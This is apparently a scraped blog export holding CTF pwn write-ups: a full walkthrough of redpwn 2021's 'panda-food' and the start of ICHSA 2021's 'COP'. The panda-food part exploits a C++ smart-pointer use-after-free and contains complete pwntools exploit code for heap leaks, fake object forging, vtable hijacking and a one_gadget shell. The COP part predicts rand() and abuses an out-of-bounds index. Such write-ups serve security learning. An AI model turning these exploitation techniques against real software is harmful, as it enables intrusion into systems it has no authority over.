-static-libgcc) chall [*] 'chall' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled chall.cc (slightly minified) #include \u003ciostream\u003e #include \u003cstring\u003e #include \u003cbits/stdc++.h\u003e #include \u003cunistd.h\u003e #include \u003csys/stat.h\u003e #include \u003cfcntl.h\u003e class Food { public: Food(std::string name) : name_(std::move(name)) {} virtual void Eat() { std::cout \u003c\u003c \"om nom nom\" \u003c\u003c std::endl; } void PrintName() { std::cout \u003c\u003c \"name: \" \u003c\u003c name_ \u003c\u003c std::endl; } std::string name_; }; class Bamboo : public Food { public: Bamboo(const std::string\u0026\u0026 name) : Food(std::move(name)) {} virtual void Eat() { std::cout \u003c\u003c \"crunch crunch\" \u003c\u003c std::endl; } }; inline size_t get_idx() { size_t idx; std::cout \u003c\u003c \"idx: \" \u003c\u003c std::endl; std::cin \u003e\u003e idx; return idx; } uint64_t rand64() { uint64_t var = 0; static int ufd = open(\"/dev/urandom\", O_RDONLY); if (read(ufd, \u0026var, sizeof(var)) != sizeof(var)) { perror(\"ufd read\"); exit(1); } return var; } int main() { std::map\u003csize_t, std::unique_ptr\u003cFood\u003e\u003e foods; Food* favorite = nullptr; int choice; while (true) { std::cout \u003c\u003c \"choice: \" \u003c\u003c std::endl; std::cin \u003e\u003e choice; switch (choice) { case 0: { size_t idx = get_idx(); std::unique_ptr\u003cFood\u003e tmp; std::string name; std::cout \u003c\u003c \"name: \" \u003c\u003c std::endl; std::cin \u003e\u003e name; if (name.length() \u003e 0x1000) { std::cout \u003c\u003c \"too big :/\" \u003c\u003c std::endl; _Exit(1); } else { if (rand64() % 2 == 1) tmp = std::make_unique\u003cBamboo\u003e(std::move(name)); else tmp = std::make_unique\u003cFood\u003e(std::move(name)); foods[idx] = std::move(tmp); } break; } case 1: { size_t idx = get_idx(); favorite = foods[idx].get(); break; } case 2: { if (favorite) favorite-\u003ePrintName(); else std::cout \u003c\u003c \"set a favorite first!\" \u003c\u003c std::endl; break; } case 3: { char one_gadget_padding[0x100]; memset(one_gadget_padding, 0, sizeof(one_gadget_padding)); if (favorite) favorite-\u003eEat(); else std::cout \u003c\u003c \"set a favorite first!\" \u003c\u003c std::endl; break; } case 4: { _Exit(0); break; } } } } Associated I/O glue: from pwnscripts import * from string import whitespace context.binary = 'chall' if args.LOCAL: context.libc = 'libc6_2.27-3ubuntu1.4_amd64' r = context.binary.process() else: r = remote('mc.ax', 31707) optc = 0 def flush(): # speed up i/o by deferring recvs until necessary global optc while optc: r.recvuntil('choice: \\n') optc -= 1 def choose(opt: int): global optc r.sendline(str(opt)) # io speed: r.sendlineafter('choice: \\n', str(opt)) optc+=1 def sendidx(idx: int): r.sendline(str(idx)) # io speed: r.sendlineafter('idx: \\n', str(idx)) def alloc(idx: int, name: bytes): assert all(c not in whitespace.encode() for c in name) # whitespace will cause cin to terminate. This necessarily means that some ASLR bytes can kill an exploit. assert len(name) \u003c 0x1000 choose(0) sendidx(idx) r.sendline(name) # io speed: r.sendlineafter('name: \\n', name) def fav(idx: int): choose(1) sendidx(idx) def printName() -\u003e bytes: choose(2) flush() r.recvuntil('name: ') return r.recvline(timeout=1)[:-1] def Eat(): choose(3) ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:1:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Exploring Looking at the code, although I‚Äôm unable to spot the obvious bug for a lack of experience, I manage to identify a few oddities: Bamboo‚Äôs constructor uses string\u0026\u0026; Food uses string. I know that \u0026 means ‚Äúpass by reference‚Äù, so only one of the two constructors will allocate and duplicate an entire string. The random nature of Food vs Bamboo probably complicates the exploit to make fuzzing a bit harder. unique_ptr\u003cBamboo\u003e gets casted away into unique_ptr\u003cFood\u003e, and unique_ptr\u003cFood\u003e can get casted into a Food* in favorite. there‚Äôs an obvious need to overwrite virtual function Eat() with a `one_gadget`` I figure I need a better understanding of the C++ types used here, so I begin to search. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:2:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"std::google The first thing I search for is std::move. It seems to magically move around memory references somehow, invalidating the argument passed to move(...). That‚Äôs interesting from a programmatic perspective, but I don‚Äôt really understand how it‚Äôll be relevant for the pwn. I search for std::make_unique next. It returns a std::unique_ptr, so I search for that too. With a little bit of reading, I figure out that I‚Äôve actually heard of unique_ptrs before, under a different name: smart pointers. The example at the link makes them really easy to understand: A unique_ptr will be deleted (freed) when it goes ‚Äúout of scope‚Äù. In the case of the current program, there‚Äôs a unique_ptr\u003cFood\u003e tmp scoped to case 0: case 0: { size_t idx = get_idx(); std::unique_ptr\u003cFood\u003e tmp; if (name.length() \u003e 0x1000) { std::cout \u003c\u003c \"too big :/\" \u003c\u003c std::endl; _Exit(1); } else { if (rand64() % 2 == 1) tmp = std::make_unique\u003cBamboo\u003e(std::move(name)); else tmp = std::make_unique\u003cFood\u003e(std::move(name)); foods[idx] = std::move(tmp); } break; } // tmp is deleted automatically here? In this case, tmp isn‚Äôt freed after breaking from case 0, which I can demonstrate readily with ltrace: $ ltrace ./chall 2\u003e\u00261 | grep -e malloc -e free -e fwrite malloc(72704) = 0x7fffd2069010 fwrite(\"choice: \", 1, 8, 0x7fcd0e4ea600) = 8 0 fwrite(\"idx: \", 1, 5, 0x7fcd0e4ea600) = 5 0 fwrite(\"name: \", 1, 6, 0x7fcd0e4ea600) = 6 hiii malloc(40) = 0x7fffd207be40 malloc(48) = 0x7fffd207be70 Over here, I‚Äôve allocated a unique_ptr\u003cFood\u003e to foods[0]. std::move effectively ‚Äútransfers ownership‚Äù2 of the smart pointer to foods[]. If I repeat that allocation, fwrite(\"choice: \", 1, 8, 0x7fcd0e4ea600) = 8 0 fwrite(\"idx: \", 1, 5, 0x7fcd0e4ea600) = 5 0 fwrite(\"name: \", 1, 6, 0x7fcd0e4ea600) = 6 heyagain malloc(40) = 0x7fffd207beb0 free(0x7fffd207be40) = \u003cvoid\u003e fwrite(\"choice: \", 1, 8, 0x7fcd0e4ea600) = 8 A free() does happen this time, because when a new unique_ptr is assigned to foods[0], the pointer that already existed at foods[0] understands that there are no references left to it (that it has gone out of scope), causing it to delete itself. At this point, I get a flash of insight as I discover what the main bug is: favorite. case 1: { size_t idx = get_idx(); favorite = foods[idx].get(); break; } favorite is a normal ‚Äúdumb‚Äù pointer. A unique_ptr from foods[] can‚Äôt keep track of favorites, and when the unique_ptr associated with favorites is freed, a dangling pointer is left in favorites, causing a use after free. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:2:1","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Testing the UAF I start with a little bit of experimentation: alloc(0, b'a'*0x47) alloc(1, b'b'*0x47) alloc(2, b'c'*0x47) fav(2) alloc(2, b'A'*0x17) alloc(1, b'B'*0x17) alloc(0, b'C'*0x17) printName() My hope here is that, in using allocations of different sizes, the merging and reallocation3 of a freed foods[2] will lead to one of the input strings overwriting *favorites. The code above produces a crash sometimes4; here‚Äôs one possible variant of a crash, where the contents of favorite are overwritten with the string data of the 2nd re-allocation: (gdb) telescope favorite 0x00007ffff76da1c0‚îÇ+0x0000: \"BBBBBBBBBBBBBBBBBBBBBBB\" 0x00007ffff76da1c8‚îÇ+0x0008: \"BBBBBBBBBBBBBBB\" 0x00007ffff76da1d0‚îÇ+0x0010: 0x0042424242424242 (\"BBBBBBB\"?) 0x00007ffff76da1d8‚îÇ+0x0018: 0x000000000000003c (\"\u003c\"?) 0x00007ffff76da1e0‚îÇ+0x0020: 0x0000000000000000 0x00007ffff76da1e8‚îÇ+0x0028: 0x0000000000000051 (\"Q\"?) 0x00007ffff76da1f0‚îÇ+0x0030: 0x0000000000000000 0x00007ffff76da1f8‚îÇ+0x0038: \"ccccccccccccccccccccccccccccccccccccccccccccccc\" 0x00007ffff76da200‚îÇ+0x0040: \"ccccccccccccccccccccccccccccccccccccccc\" 0x00007ffff76da208‚îÇ+0x0048: \"ccccccccccccccccccccccccccccccc\" At this point, it might be helpful to describe my approximation of how Food/Bamboo is represented in memory: struct Food { void **_vtable; // _vtable[0] == Eat() basic_string name_; } struct basic_string { union { struct { char *p; // when capacity\u003e0xf, p holds a pointer to the actual bytes of the string data. size_t size; // don't really know what happens to this for capacity \u003c 0x10 } char buf[0x10]; } size_t capacity; } // sizeof(basic_string) == 0x20 The invalid favorite struct has favorite-\u003ename_.p pointing to 0x4242424242424242, which necessarily causes a segfault when dereferenced. If I change b'B'*0x17 in my exploit code to fit({8: pack(ptr)})+b'B'*7, I‚Äôll be able to leak the contents of ptr. The conditions are not favorable: Start End Offset Perm Path 0x00005576017e3000 0x00005576018ca000 0x0000000000000000 r-x chall 0x0000557601ac9000 0x0000557601ad1000 0x00000000000e6000 r-- chall 0x0000557601ad1000 0x0000557601ad2000 0x00000000000ee000 rw- chall 0x0000557601ad2000 0x0000557601ad5000 0x0000000000000000 rw- 0x0000557603514000 0x0000557603535000 0x0000000000000000 rw- [heap] 0x00007f2678706000 0x00007f2678709000 0x0000000000000000 rw- 0x00007f2678709000 0x00007f267872e000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f267872e000 0x00007f26788a6000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788a6000 0x00007f26788f0000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f0000 0x00007f26788f1000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f1000 0x00007f26788f4000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f4000 0x00007f26788f7000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f7000 0x00007f26788fb000 0x0000000000000000 rw- 0x00007f26788fb000 0x00007f267890a000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f267890a000 0x00007f26789b1000 0x000000000000f000 r-x /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f26789b1000 0x00007f2678a48000 0x00000000000b6000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f2678a48000 0x00007f2678a49000 0x000000000014c000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f2678a49000 0x00007f2678a4a000 0x000000000014d000 rw- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f2678a4a000 0x00007f2678a4c000 0x0000000000000000 rw- 0x00007f2678a62000 0x00007f2678a63000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a63000 0x00007f2678a86000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a86000 0x00007f2678a8e000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a8f000 0x00007f2678a90000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a90000 0x00007f2678a91000 0x000000000002d000 rw- /usr/lib/x86_","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:2:2","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Exploit hypothesis After a bit more experimentation, I successfully leak a pointer by doing this: alloc(0, b'a'*0x97) fav(0) alloc(0, b'A'*0x27) print(printName()) Resulting in: [+] Opening connection to mc.ax on port 31707: Done 0x55f53971df10000000000000000000000000000000000000000000000000000055f53971dec00000000000000000000055f53971de90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000100000001000100 That 0x55 could be a heap pointer or a PIE pointer, so I do a lot of gdb work to figure out that this primitive leaks data from the tcache, and that the pointers leaked above are necessarily heap pointers. Right now, I have an unreliable exploit that, when successful, can produce an arbitrary read, as well as RIP control. a reliable heap pointer leak Since struct Foods are stored on the heap, the pointer to their vtables (which are stored at a PIE address) can be leaked. That PIE leak can be used to further leak a libc address from the GOT, and that leak can be used to overwrite RIP with a one_gadget. So, problem solved? Not quite. My primitive for arbitrary read / RIP control ‚Äî the fake struct Food primitive ‚Äî isn‚Äôt reliable enough to be executed 3 times in succession on a single connection. I need to try something else. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:3:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Better primitives Here‚Äôs my first idea: find some way to toss the pointer for favorites onto the unsorted bin. Once that‚Äôs accomplished, favorites-\u003ebk should point to somewhere near main_arena, just as how putting favorites on the tcache caused favorites-\u003ebk to point to somewhere on the heap. Leaking libc immediately would reduce the number of fake struct Foods required to 1, which was demonstrated prior to be achievable. I work on heap feng shui for a really long time, and although I managed to bring the favorites pointer onto the fastbins and the smallbins, it never gets chucked into the unsorted bin. Shifting tracks, I move on to work on a better fake struct Food primitive. I run a lot of ltrace experiments, and I eventually come up with a pseudocode understanding of how/when free() and malloc() is called in case 0: idx = getidx() is_new = not foods.count(idx) name = input() if name.size() \u003e 0xf: # if `name` needs name.p sz = 31 backing_store = malloc(sz) while sz \u003c= name.size(): free(backing_store) sz = sz*2-1 malloc(sz) tmp = malloc(40) # unique \u003cFood\u003e or \u003cBamboo\u003e if name.size() \u003e 0xf: tmp.name_.p = backing_store typ = rand64()%2 # 1 means bamboo if typ: tmp.name_.p = alloc(name.size()+1) # store copy of string if is_new: malloc(48) # allocate space for map if not is_new and foods[idx].name_.capacity \u003e 0xf: free(foods[idx].name_.p) if typ: free(backing_store) if not is_new: free(foods[idx]) foods[idx] = tmp I do even more experiments, and I hit a good solution: Make sure the tcache is empty; it‚Äôs LIFO. create a new unique_ptr at foods[idx], where foods[idx] has never been allocated before. Ensure that name.size() \u003e 0x28 to keep tcache[size=0x30] empty. favorite foods[idx]; repeat step 2. tcache[size=0x30] should only contain favorites now. create a new unique_ptr at foods[nidx], where foods[nidx] has never been allocated before, and name.size() lies within [0x10, 0x18). If foods[nidx] was a Bamboo5, favorites remains at the top of tcache[size=0x30], and step 4 should be repeated. Otherwise, favorites was overwritten with the name from step 4. favorites has a (1/2)**i chance of being overwritten correctly, where i is the number of times step 4 happens. Programmatically: def fakeFood(payload: bytes) -\u003e int: '''creates a fake Food struct containing `payload` at a random `idx`, stored as favorite. returns idx''' idx = randint(100,1\u003c\u003c30) alloc(idx, b'b'*60) fav(idx) alloc(idx, b'b'*60) for i in range(10): alloc(idx+i+1, payload[:0x17].ljust(0x17, b'\\0')) return idx This works reliably (1/1024 failure rate), so long as payload contains no whitespace (~1/15 failure rate). Right now, I have: a reliable exploit that produces an arbitrary read, as well as RIP control. a reliable heap pointer leak Can I finish the challenge? Maybe. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:3:1","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Exploitation minutiae First of all, I need to figure out the offsets to get from leak-to-leak. The heap base is easy to figure out: heapbase = (heapleak\u003e\u003e12)\u003c\u003c12 But what do you do with that? I need to find the location of an active struct Food in memory for leaking, so I search for it: def leak(addr: int, sz: int=8): # leak the first `sz` bytes from `addr` fakeFood(fit({8:addr,0x10:sz+8})) return unpack(printName()[:sz],'all') alloc(1, b'a'*7) search_str = b'\\0%s\\0' % (b'a'*7) foods1_offset = next(i for i in range(0,99999,0x1000) if search_str in (dat := pack(leak(heapbase+i,0x1000),'all'))) foods1_offset+= dat.index(search_str)-0x17 # -0x17 because that's the distance from this string to the _vtable. PIE_leak = leak(heapbase+foods1_offset) # this is a leak of `food[idx]-\u003e_vtable`. The pointer leaked is either Food‚Äôs vtable or Bamboo‚Äôs vtable, depending on what food[idx] was. I‚Äôll use that information to calculate the PIE base: def checkWhich(idx: int) -\u003e str: '''figure out if foods[idx] was a Bamboo or a Food. Destroys the current `favorite`.''' fav(idx) Eat() flush() return 'bamboo' if b'crunch' in r.recvline() else b'food' context.binary.address = pie_leak - (0x2e7d78 if checkWhich(1) == 'bamboo' else 0x2e7d50) The next part is almost robotic: leaking libc from the GOT. context.libc = context.libc_database.libc_find({f:leak(context.binary.got[f]) for f in ['malloc', 'free']}) Finally, I just need to set favorites-\u003e_vtable = \u0026one_gadget to win. I flood the heap with copies of one_gadget and leak out its position accordingly to pop a shell: og = context.libc.select_gadget(1) # (2) doesn't work; memset() in chall.cc was optimised out in the actual binary... alloc(2, pack(og)*0x1ff) # flood the heap with the one_gadget to make finding heap offset easier fakeFood(pack(heapbase+next(i for i in range(0,0x5000,0x800) if leak(heapbase+i) == og))) flush() Eat() r.interactive() That‚Äôs the end. Fun challenge. [+] Opening connection to mc.ax on port 31707: Done [*] heap: 0x559d3b513000 [*] PIE: 0x559d39fd3000 [*] found libc! id: libc6_2.27-3ubuntu1.4_amd64 [*] one_gadget: 0x7f8d39985432 [*] Switching to interactive mode idx: name: choice: $ ls flag.txt run $ cat flag.txt flag{hijacking_vtables_like_321_4243f93} ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:3:2","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Footnotes Necessarily, this writeup will be riddled with misinformation and mistakes. Don‚Äôt take this as gospel, read the sources for yourself, and make a PR on this writeup if there‚Äôs a mistake you really care about. This is not the proper terminology and I won‚Äôt pretend I know what it ought to be. This doesn‚Äôt happen at all in reality. It‚Äôs almost impossible to remerge any of the allocations back into malloc_arena-\u003etop, meaning that most allocations remain confined to their own tcaches (and fastbins/smallbins if necessary), The experiment here worked as a matter of coincidence: when string.size() is in the range [0x10, 0x1f), a malloc(0x1f) call is made to handle it. This just-so-happens to land in tcache[size=0x30], which is also host to Food/Bamboo structs. The odds of crashing are proportional to the number of size=0x30 chunks present on the tcache. It‚Äôs easier to understand once you grasp how allocations are handled, but in short: the first reallocation ('A') puts foods[2] on tcache[size=0x30]. The second allocation will overwrite that chunk with B if its not a Food type, giving baseline odds of 50%. These odds go downhill if the tcache is filled with enough garbage ‚Äì something which I didn‚Äôt draw a connection to until I figured out a consistent exploit primitive. In any case, (50%)**3 isn‚Äôt good enough odds for the exploit I want. I‚Äôm still not sure about this part. The code seems to indicate vice versa, but either way it‚Äôs still a 1/2 chance per loop. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:4:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"TLDR free a unique_ptr\u003cFood\u003e by overwriting an already existing foods[idx] saving a Food* pointer in favorite allows for a UAF; -\u003ebk can be used to leak the heap Modify the contents of favorite by heap-feng-shui-ing an 0x30 heap chunk onto the backing store for string name Use modified favorites to leak PIE from heap, and libc from PIE modify favorite‚Äôs vtable to jump to one_gadget ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:5:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Code note: your libc-database might contain libc6_2.27-3ubuntu1.3_amd64; I removed it because the package for that libc version appears to be deleted. It‚Äôs also worth noting that this code should succeed both locally and on remote. from pwnscripts import * from string import whitespace from random import randint context.binary = 'chall' if args.LOCAL: context.libc = 'libc6_2.27-3ubuntu1.4_amd64' r = context.binary.process() else: r = remote('mc.ax', 31707) optc = 0 def flush(): # speed up i/o by deferring recvs until necessary global optc while optc: r.recvuntil('choice: \\n') optc -= 1 def choose(opt: int): global optc r.sendline(str(opt)) # io speed: r.sendlineafter('choice: \\n', str(opt)) optc+=1 def sendidx(idx: int): r.sendline(str(idx)) # io speed: r.sendlineafter('idx: \\n', str(idx)) def alloc(idx: int, name: bytes): assert all(c not in whitespace.encode() for c in name) # whitespace will cause cin to terminate. This necessarily means that some ASLR bytes can kill an exploit. assert len(name) \u003c 0x1000 choose(0) sendidx(idx) r.sendline(name) # io speed: r.sendlineafter('name: \\n', name) def fav(idx: int): choose(1) sendidx(idx) def printName() -\u003e bytes: choose(2) flush() r.recvuntil('name: ') return r.recvline(timeout=1)[:-1] def Eat(): choose(3) def checkWhich(idx: int) -\u003e str: '''figure out if foods[idx] was a Bamboo or a Food. Destroys the current `favorite`.''' fav(idx) Eat() flush() res = r.recvline() if b'crunch' in res: return 'bamboo' if b'nom nom' in res: return 'food' raise RuntimeError('wrong food') # step 1: leak heap using a UAF alloc(0, b'a'*0x97) # larger allocation to allow for larger leak alloc(1, b'a'*0x7) # needed for PIE leak later fav(0) alloc(0, b'A'*0x27) # Freeing foods[0] causes favorite-\u003ename_ to point to the tcache @ heap+0x10 (since favorite-\u003ename_ == [favorite+0x8] == (malloc_chunk*)favorite-\u003ebk) heapbase = unpack(printName()[72:80])\u00260xfffffffff000 # tcache[72:80] == tcache[size=0x30]. \u0026 to get base. log.info('heap: '+hex(heapbase)) '''on a brand new allocation, - malloc 40 (Food/Bamboo) - if foods[idx] doesn't exist, malloc 48 (map element) - if name.size() \u003e 0xf, malloc space for string (31, 61, 121, ...). - if food type is Bamboo, allocate name.size() space for a copy of the string. - if foods[idx] exists, free the backing store for foods[idx]-\u003ename_ (if foods[idx]-\u003ename_.size() was \u003e 0xf), and then free foods[idx] itself.''' def fakeFood(payload: bytes) -\u003e int: '''creates a fake Food struct containing `payload` at a random `idx`, stored as favorite. returns idx''' idx = randint(100,1\u003c\u003c30) # negligible chance of overlap alloc(idx, b'b'*60) # alloc 40, 48, 61, and potentially alloc\u0026\u0026free 61. fav(idx) alloc(idx, b'b'*60) # alloc 40\u002661, free previous 61\u002640. # the Food struct for `favorite` is at the top of tcache[size=0x30] at this point. for i in range(10): # There's a 1/2 that `favorite` is overwritten with the payload for every loop here. (1/2)**10 is a small enough error rate. # The other 1/2 chance puts `favorite` back on the top of tcache, so just repeat to increase odds. alloc(idx+i+1, payload[:0x17].ljust(0x17, b'\\0')) # Note that len(payload) must not be within [0x18, 0x28) to prevent an additional 0x30 chunk allocation. # len(payload) \u003e 0x1f is also forbidden because it would cause the malloc(31) string buffer to be freed. This resolves to len(payload) \u003c 0x17. return idx def leak(addr: int, sz: int=8): # leak the first `sz` bytes from `addr` fakeFood(fit({8:addr,0x10:sz+8})) return unpack(printName()[:sz],'all') # step 2: heap leak -\u003e PIE leak -\u003e libc leak foods1_offset = next(i for i in range(0,99999,0x1000) if b'\\0aaaaaaa\\0' in (dat := pack(leak(heapbase+i,0x1000),'all'))) # note that this is actually a constant, but I prefer finding the offset dynamically pie_leak = leak(heapbase+foods1_offset+dat.index(b'\\0aaaaaaa\\0')-23) # this is a leak of foods[1].vtable. context.binary.address = pie_leak - (0x2e7d78 if checkWhich(1) == 'bamboo' else 0x2e7d50) # offset to the .relro vtable of ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:6:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"A slightly less boring problem.","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"There weren‚Äôt many pwn challenges in ICHSA CTF, but this challenge was a little bit fun for its originality. COP [500] Hi COP I wrote a game that should be impossible to win. A friend of mine managed to get the flag in a few seconds. Can you help me find out how? Connect: nc cop.ichsa.ctf.today 8011 challenge author: Yossef Kuszer Files: COP.zip Original: $ tree COP COP ‚îú‚îÄ‚îÄ chalenge.c ‚îú‚îÄ‚îÄ chalenge.h ‚îú‚îÄ‚îÄ cop.gif ‚îú‚îÄ‚îÄ description.md ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ DockerInstructions.md ‚îî‚îÄ‚îÄ flag.txt Updated version: $ unzip -l COP.zip Archive: COP.zip Length Date Time Name --------- ---------- ----- ---- 0 2021-06-01 22:13 COP1/ 15690 2021-05-09 20:29 COP1/chalenge.c 71732 2021-05-06 10:43 COP1/chalenge.h 3916371 2021-05-09 20:52 COP1/cop.gif 190 2021-05-10 09:01 COP1/description.md 519 2021-05-09 20:25 COP1/Dockerfile 119 2021-05-10 09:55 COP1/DockerInstructions.md 21 2021-05-30 12:28 COP1/flag.txt 1035536 2021-06-01 22:05 COP1/game --------- ------- 5040178 9 files The binary is compiled with -static, so there‚Äôs no need for libc. As for the binary itself: [*] 'game' Arch: amd64-64-little RELRO: Partial RELRO ! Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ! Source code is provided, so I‚Äôll be skipping on the usual decompilation effort. ","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/:0:0","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"Bugs +===============================================+ | Wellcome to my Rock-Paper-Scissors's game | +-----------------------------------------------+ | Current score: | NOOB player: 0 Points | Computer: 0 Points +-----------------------------------------------+ | Options: | 1) Display game rules ------------- (0 Points) | 2) Play next round ---------------- (0 Points) | 3) Skip N rounds ------------------ (2 Points) | 4) Enable Ascii-art --------------- (3 Points) | 5) Change user name --------------- (5 Points) | 6) Print the flag! ------- (4294967295 Points) | 7) Exit --------------------------- (0 Points) +-----------------------------------------------+ | Please chose an option [ ] The challenge provided is a simple rock-paper-scissors simulator, limited to ARRAY_OF_PLAYS_MAX_SIZE == 170 rounds. When the game starts, the program will initialize the 170 moves the computer plans to play using rand()/srand(): // initializing pseudo-random values and populate array_of_plays srand(0); for(uint8_t i = 0; i \u003c ARRAY_OF_PLAYS_MAX_SIZE; i++) { game_ctx-\u003earray_of_plays[i].id = i; game_ctx-\u003earray_of_plays[i].handsign = (rand() % MAX_HANDSIGNS) + MIN_HANDSIGN; game_ctx-\u003earray_of_plays[i].animation_function = print_ascii; } rand() is predictable, and we can win every round of Rock-Paper-Scissors with 100% accuracy: from pwn import * context.binary = 'game' from ctypes import CDLL clib = CDLL('libc.so.6') clib.srand(0) ARRAY_OF_PLAYS_MAXSIZE = 170 array_of_plays = [clib.rand()%3 for _ in range(ARRAY_OF_PLAYS_MAXSIZE)] current_play = 0 r = remote('cop.ichsa.ctf.today', 8011) def choose(opt: int): r.recvuntil('[ ]\\b\\b') r.sendline(str(opt)) def win_round(): global current_play choose(2) r.recvuntil('[ ]\\b\\b') cpu_play = array_of_plays[current_play] current_play += 1 user_play = {0:1, 1:2, 2:0}[cpu_play]+1 r.sendline(str(user_play)) Unfortunately, we‚Äôll never obtain the flag by just winning normal rounds, because the option to obtain the flag requires 4294967295 Points. This is where Skip N Rounds comes into play. The code for skip_n_rounds() seems safe enough: printf(\"| You chose to skip %u rounds\\n\", rounds_to_skip); // Check for uint8_t integer overflow if(OVERFLOW_CHECK(rounds_to_skip,ARRAY_OF_PLAYS_MAX_SIZE)) SET_STATUS_TO_FALSE_AND_BREAK(status) if(game_ctx-\u003ecurrent_play + rounds_to_skip \u003e ARRAY_OF_PLAYS_MAX_SIZE) SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, \"| Overflow - Not jumping\\n\") CHANGE_GAME_CTX_FIELD(current_play, game_ctx-\u003ecurrent_play + rounds_to_skip) The last if-statement in there is bugged as a result of chalenge.h: #ifndef DEBUG_MODE ... #define POINTS_TO_PRINT_FLAG -1u // UINT64_MAX #define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg) #else #define POINTS_TO_PRINT_FLAG 0 #define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg) \\ {\\ printf(msg);\\ SET_STATUS_TO_FALSE_AND_BREAK(status)\\ } #endif The macro SET_STATUS_TO_FALSE_PRINT_AND_BREAK() expands to nothing when DEBUG_MODE is off. We know that this is the case because POINTS_TO_PRINT_FLAG is -1u and not 0. Because of this, game_ctx-\u003ecurrent_play can be increased beyond ARRAY_OF_PLAYS_MAX_SIZE. This results in an oob array index in play_next_round(): bool play_next_round() { ... struct play current_play = {0}; ... current_play = game_ctx-\u003earray_of_plays[game_ctx-\u003ecurrent_play]; That oob array index allows us to generate an arbitrary struct play current_play. To grasp why, we need to backtrack and cover a few other details. First off, game_ctx-\u003earray_of_plays == 0xC0FFEE2000, and game_ctx == 0xC0FFEEF000. This happens because of mmap() address hints: #define GAME_CTX_ID (void *) 0xC0FFEEFAC3 #define ARRAY_OF_PLAYS_ID (void *) 0xC0FFEE2A11 void init_game(){ // Allocate some memory for the game_ctx game_ctx = mmap(GAME_CTX_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMOUS, -1,0); ... // Allocate some memory for the game_ctx-\u003earray_of_plays game_ctx-\u003earray_of_plays = mmap(ARRAY_OF_PLAYS_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMO","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/:1:0","tags":["pwn","writeup"],"title":"ICHSA 2021: 